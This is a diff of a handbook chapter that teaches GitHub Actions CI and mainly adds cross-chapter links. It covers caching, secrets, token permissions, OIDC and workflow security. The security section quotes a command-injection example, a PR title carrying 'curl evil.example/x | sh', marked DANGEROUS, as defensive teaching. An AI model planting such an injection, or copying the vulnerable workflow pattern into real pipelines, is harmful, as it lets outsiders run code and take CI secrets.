@@ -6,7 +6,7 @@ description: "Writing real CI pipelines with GitHub Actions: workflows, events, 
 
 # 11.2 CI with GitHub Actions
 
-Chapter 11.1 described what a pipeline should do. This chapter is about **writing** one. **GitHub Actions** is the CI/CD system built into GitHub. It runs **workflows**, YAML files in `.github/workflows/`, on GitHub's machines whenever something happens in your repository: a push, a pull request, a tag, a schedule, a button. It's free for public repositories, which is why this whole handbook, its website and snip's images are built and tested on it at no cost. The ideas carry straight over to GitLab CI, CircleCI, Jenkins and the rest; only the YAML differs. You'll read this repository's real workflows piece by piece, learn the features that make pipelines fast and the settings that make them safe, then write your own from scratch in a fork.
+[Chapter 11.1](./how-software-ships.mdx) described what a pipeline should do. This chapter is about **writing** one. **GitHub Actions** is the CI/CD system built into GitHub. It runs **workflows**, YAML files in `.github/workflows/`, on GitHub's machines whenever something happens in your repository: a push, a pull request, a tag, a schedule, a button. It's free for public repositories, which is why this whole handbook, its website and snip's images are built and tested on it at no cost. The ideas carry straight over to GitLab CI, CircleCI, Jenkins and the rest; only the YAML differs. You'll read this repository's real workflows piece by piece, learn the features that make pipelines fast and the settings that make them safe, then write your own from scratch in a fork.
 
 ## What you'll learn
 
@@ -83,19 +83,19 @@ snip:
     - run: go build ./...
 ```
 
-- **`services:`** starts real Postgres and Redis containers before the steps run. `--health-cmd` makes the job wait until Postgres is actually ready: the same healthcheck idea as Compose (chapter 9.3). snip's integration tests (chapter 6.6) connect to them through the `SNIP_TEST_*` variables. Testing against the real database, not a fake, is what catches wrong SQL.
+- **`services:`** starts real Postgres and Redis containers before the steps run. `--health-cmd` makes the job wait until Postgres is actually ready: the same healthcheck idea as Compose ([chapter 9.3](../containers/docker-compose.mdx)). snip's integration tests ([chapter 6.6](../data/postgres-from-go.mdx)) connect to them through the `SNIP_TEST_*` variables. Testing against the real database, not a fake, is what catches wrong SQL.
 - **`setup-go` with `cache-dependency-path`** caches downloaded modules and build output between runs, keyed on `go.sum`. Unchanged dependencies aren't downloaded again.
-- Each `run:` step is a shell script. **If any command fails (non-zero exit code, chapter 2.4), the step fails, the job stops, and the run turns red.**
+- Each `run:` step is a shell script. **If any command fails (non-zero exit code, [chapter 2.4](../linux/bash-scripting.mdx)), the step fails, the job stops, and the run turns red.**
 
 ### The Compose and Kubernetes jobs
 
-Other jobs go further, starting the whole system. `snip-stack` runs `docker compose up --wait` and then scripts chapter 9.3's lab. `snip-k8s` creates a Kubernetes cluster on the runner with the `helm/kind-action` action, loads a freshly built image, applies the manifests, and runs every Part 10 lab: the smoke test, deleting a Pod, a rolling update under traffic, NetworkPolicies, the Gateway, breaking things four ways, and the Helm chart. It's the same idea as a unit test, scaled up: **if the handbook tells readers something works, a machine checks it on every change.**
+Other jobs go further, starting the whole system. `snip-stack` runs `docker compose up --wait` and then scripts [chapter 9.3](../containers/docker-compose.mdx)'s lab. `snip-k8s` creates a Kubernetes cluster on the runner with the `helm/kind-action` action, loads a freshly built image, applies the manifests, and runs every [Part 10](../kubernetes/why-orchestration.mdx) lab: the smoke test, deleting a Pod, a rolling update under traffic, NetworkPolicies, the Gateway, breaking things four ways, and the Helm chart. It's the same idea as a unit test, scaled up: **if the handbook tells readers something works, a machine checks it on every change.**
 
 ---
 
 ## Making it fast
 
-A slow pipeline gets ignored (chapter 11.1). The main techniques:
+A slow pipeline gets ignored ([chapter 11.1](./how-software-ships.mdx)). The main techniques:
 
 - **Parallel jobs.** Independent checks go in separate jobs, which run at the same time. This repository's CI has eight jobs; a run takes about as long as the slowest one.
 - **Dependencies between jobs** only where needed: `needs: build` makes a job wait for `build` and lets it use its outputs. `deploy.yml` uses it so publishing waits for the build.
@@ -139,7 +139,7 @@ A CI system holds the keys to your kingdom: it can push code, publish packages a
 
 ### Secrets and the GITHUB_TOKEN
 
-**Secrets** (repository or organisation settings → Secrets and variables → Actions) are encrypted values made available to workflows as `${{ secrets.NAME }}`. GitHub masks them in logs. Use them for things like a registry password or an API key, and never commit them (chapter 7.6).
+**Secrets** (repository or organisation settings → Secrets and variables → Actions) are encrypted values made available to workflows as `${{ secrets.NAME }}`. GitHub masks them in logs. Use them for things like a registry password or an API key, and never commit them ([chapter 7.6](../security/secrets-management.mdx)).
 
 Every run also gets an automatic, short-lived **`GITHUB_TOKEN`**, which lets the workflow call GitHub's API for this repository, for example to push an image to `ghcr.io`. Give it **only** the permissions it needs, with a `permissions:` block:
 
@@ -158,7 +158,7 @@ If a malicious dependency or a compromised action runs inside your CI, a read-on
 
 ### OIDC instead of stored cloud keys
 
-To deploy to a cloud (Part 12), a workflow needs cloud credentials. The old way was a long-lived access key stored as a secret, which could leak and stay valid for years. The modern way is **OIDC** (OpenID Connect): with `permissions: id-token: write`, the workflow requests a short-lived signed token from GitHub saying "I'm workflow X in repository Y on branch main". The cloud is configured to trust exactly that identity and hands out temporary credentials. There's no stored secret at all. `deploy.yml` uses the same mechanism to publish to GitHub Pages, and chapter 12.4 sets it up for a cloud.
+To deploy to a cloud ([Part 12](../cloud/cloud-from-zero.mdx)), a workflow needs cloud credentials. The old way was a long-lived access key stored as a secret, which could leak and stay valid for years. The modern way is **OIDC** (OpenID Connect): with `permissions: id-token: write`, the workflow requests a short-lived signed token from GitHub saying "I'm workflow X in repository Y on branch main". The cloud is configured to trust exactly that identity and hands out temporary credentials. There's no stored secret at all. `deploy.yml` uses the same mechanism to publish to GitHub Pages, and [chapter 12.4](../cloud/iam.mdx) sets it up for a cloud.
 
 ### Pin what you run
 
@@ -166,7 +166,7 @@ To deploy to a cloud (Part 12), a workflow needs cloud credentials. The old way 
 
 ### Don't let untrusted text become code
 
-This is the most common serious bug in workflows. Anything an outsider controls (a pull request title, a branch name, an issue comment) is **untrusted input** (chapter 7.5). Putting it directly into a `run:` script lets them inject shell commands:
+This is the most common serious bug in workflows. Anything an outsider controls (a pull request title, a branch name, an issue comment) is **untrusted input** ([chapter 7.5](../security/web-attacks.mdx)). Putting it directly into a `run:` script lets them inject shell commands:
 
 ```yaml
 # DANGEROUS: a PR titled  a"; curl evil.example/x | sh; echo "  runs their command
@@ -178,7 +178,7 @@ This is the most common serious bug in workflows. Anything an outsider controls 
   run: echo "Checking $TITLE"
 ```
 
-`${{ }}` expressions are pasted into the script **before** the shell runs it, exactly like SQL injection's string concatenation (chapter 7.5). Environment variables are the equivalent of parameterised queries.
+`${{ }}` expressions are pasted into the script **before** the shell runs it, exactly like SQL injection's string concatenation ([chapter 7.5](../security/web-attacks.mdx)). Environment variables are the equivalent of parameterised queries.
 
 :::danger
 Be very careful with the **`pull_request_target`** trigger. Unlike `pull_request`, it runs with the base repository's secrets and a write-capable token, even for pull requests from forks. A workflow that uses it *and* checks out and runs the pull request's code hands your secrets to anyone who opens a PR. If you don't know you need it, you don't.
@@ -352,7 +352,7 @@ jobs:
 <summary>Your CI takes 25 minutes, mostly one job that builds a Docker image from scratch and then runs all tests inside it. How would you speed it up?</summary>
 
 - **Split** into parallel jobs: unit tests (no Docker needed, with dependency caching), image build, and integration tests.
-- **Cache Docker layers** (`cache-from/cache-to: type=gha` with `docker/build-push-action`), and order the Dockerfile so dependencies are cached separately from code (chapter 9.2).
+- **Cache Docker layers** (`cache-from/cache-to: type=gha` with `docker/build-push-action`), and order the Dockerfile so dependencies are cached separately from code ([chapter 9.2](../containers/writing-dockerfiles.mdx)).
 - **Cache language dependencies** with the setup actions (`cache: npm`, `setup-go`'s cache).
 - **Test the code directly** on the runner for fast feedback, and keep a smaller set of tests that need the full image.
 - **Only run what changed** with path filters, where parts of the repository are independent.
